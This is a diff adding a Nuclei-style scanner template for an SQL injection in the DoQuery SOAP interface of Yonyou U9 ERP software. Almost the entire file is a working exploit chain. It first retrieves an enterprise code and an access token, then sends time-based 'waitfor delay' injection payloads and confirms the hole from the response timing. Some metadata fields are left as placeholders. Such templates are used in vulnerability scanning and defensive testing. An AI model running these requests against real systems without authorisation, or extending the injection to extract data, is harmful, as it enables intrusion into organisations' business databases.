@@ -1,0 +1,110 @@
+id: yongyou-u9-DoQuery-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 用友u9 DoQuery 接口存在SQL注入，攻击者可通过该漏洞获取敏感信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU9%E7%B3%BB%E7%BB%9FDoQuery%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 309
+        SOAPAction: "http://tempuri.org/GetEnterprise"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetEnterprise xmlns="http://tempuri.org/" />
+          </soap:Body>
+        </soap:Envelope>
+      - |-
+        POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 345
+        SOAPAction: "http://tempuri.org/GetToken"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetToken xmlns="http://tempuri.org/">
+              <endId>{{codec}}</endId>
+            </GetToken>
+          </soap:Body>
+        </soap:Envelope>
+      - |
+        POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 345
+        SOAPAction: "http://tempuri.org/DoQuery"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <DoQuery xmlns="http://tempuri.org/">
+              <token>{{token}}</token>
+              <command>select 1;waitfor delay '0:0:3' --</command>
+            </DoQuery>
+          </soap:Body>
+        </soap:Envelope>
+      - |
+        POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 345
+        SOAPAction: "http://tempuri.org/DoQuery"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <DoQuery xmlns="http://tempuri.org/">
+              <token>{{token}}</token>
+              <command>select 1;waitfor delay '0:0:6' --</command>
+            </DoQuery>
+          </soap:Body>
+        </soap:Envelope>
+      - |
+        POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 345
+        SOAPAction: "http://tempuri.org/DoQuery"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <DoQuery xmlns="http://tempuri.org/">
+              <token>{{token}}</token>
+              <command>select 1;waitfor delay '0:0:9' --</command>
+            </DoQuery>
+          </soap:Body>
+        </soap:Envelope>
+    extractors:
+      - type: regex
+        name: codec
+        group: 1
+        regex:
+           - '{"Code":"(\d{10})"'
+        internal: true
+
+
+      - type: regex
+        name: token
+        group: 1
+        regex:
+           - '"Token":"([^"]+)"'
+        internal: true
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_3>=3  && duration_3<=6"
+          - "duration_4>=6  && duration_4<=9"
+          - "duration_5>=9  && duration_5<=12"
